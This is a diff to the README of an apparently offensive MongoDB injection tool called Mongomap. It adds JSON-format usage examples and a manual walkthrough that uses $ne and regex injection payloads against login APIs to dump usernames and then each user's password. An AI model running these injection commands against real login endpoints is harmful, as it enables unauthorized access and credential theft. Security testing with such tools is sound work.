@@ -13,6 +13,7 @@ However, I am open to supporting more DB backends, and making my code more effic
 ## Installation
 As of now, Mongomap as 2 dependencies:
 requests
+
 colorama
 
 You can use the package manager [pip](https://pip.pypa.io/en/stable/) to install these libraries.
@@ -44,6 +45,7 @@ By Hex_27
     -u          Refers to the URL of the target. Includes port and get parameters if you are using get requests.
     --method    Set to either "post" or "get". By default, this will be set to "get"
     --data      If you are using post requests, use this option to specify post data
+    --file      Same as --data, but you specify a file containing the parameters instead.
 
 [*] --Flexibility--
     --cookies   Set cookies to send. Separate different cookies with &
@@ -74,7 +76,34 @@ By Hex_27
 [*] mongomap -u http://192.168.1.321 --method post --data "username=hi&password=letmein"
 [*] mongomap -u https://target.com:1231?foo=1 --cookies "PHPSESSID=1242345234512345&ID=123"
 [*] mongomap -u http://10.10.10.123 --method post --data search=1 --headers "Host: administrator1.friendzone.red; User-Agent: imlazytotypethis"
+[*] mongomap -u http://152.104.10.55:20001/v1/account/login --method json --data {\"username\":\"admin\",\"password\":\"1\"}
+[*] mongomap -u http://175.104.10.55:20001/v1/account/login --method json --data {\"username\":{\"$ne\":\"1\"},\"password\":\"1\"}
+[*] mongomap -u http://112.104.10.55:20001/v1/account/login --method json --file params.txt
 ```
+
+### Why does my regex check not work, despite it being vulnerable?
+
+Because the tool is dumb and I can't think of a good way to implement an automatic solution for this.
+
+If you have multiple parameters, technique 1 (Regex injection) for extracting plaintext data won't work properly automatically.
+
+So, just give it a little help, and do things manually step by step. Let's say you have a username and a password, and you want to extract both usernames and passwords.
+
+Step 1, get the usernames
+```bash
+mongomap -u http://noobsite.com/api/login --method json --data {\"username\":\"1\",\"password\":{\"$ne\":\"1\"}} -p username
+```
+This should force mongomap to dump out all usernames it can extract.
+
+Step 2, find the password for each username. 
+```bash
+mongomap -u http://noobsite.com/api/login --method json --data {\"username\":\"admin\",\"password\":\"1\"} -p password
+```
+Let's say one of the dumped usernames from Step 1 is "admin". Set that as the username, then force the vulnerable parameter to be password.
+
+Now, mongomap will attempt to dump the password of admin. 
+
+Yay. It works. Kinda.
 
 ## What does it work against?
 You can check the full description of each technique I've written to perform MongoDB Injection with this command:
@@ -87,6 +116,8 @@ Injecting WHERE requests by parsing javascript with single or double quote escap
 
 The tool attempts to detect differences in page contents, or status code, in order to determine success in injection.
 However, the difference detection mechanism is still kind of skimpy and prone to false positives, and definitely can be polished more.
+
+Additionally, as a new feature, mongomap will now work with json data types for technique 0 and 1, the not equals injection and the regex injection.
 
 ## Contributing
 Pull requests are welcome, though I may take a while to respond.
